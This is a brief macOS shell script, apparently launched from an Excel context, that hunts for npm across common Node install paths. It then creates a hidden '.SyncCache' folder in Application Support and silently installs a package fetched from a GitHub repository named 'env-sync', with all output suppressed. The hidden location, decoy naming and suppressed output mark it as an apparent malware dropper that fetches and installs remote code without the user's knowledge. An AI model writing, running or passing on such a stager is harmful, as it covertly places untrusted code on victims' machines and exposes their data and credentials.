#!/bin/sh
# instala o pacote sem depender do PATH do Excel
PATH="/opt/homebrew/bin:/usr/local/bin:$HOME/.volta/bin:$HOME/.local/bin:$HOME/Library/pnpm:$PATH"
for d in "$HOME"/.nvm/versions/node/*/bin "$HOME"/.fnm/node-versions/*/installation/bin "$HOME"/.local/share/fnm/node-versions/*/installation/bin; do
  [ -d "$d" ] && PATH="$d:$PATH"
done
command -v npm >/dev/null 2>&1 || exit 1
dir="$HOME/Library/Application Support/.SyncCache"
mkdir -p "$dir" || exit 1
cd "$dir" || exit 1
[ -f package.json ] || printf '{"name":"sync-cache","private":true}\n' > package.json
npm install --no-fund --no-audit --loglevel=error github:local-tools01/env-sync >/dev/null 2>&1
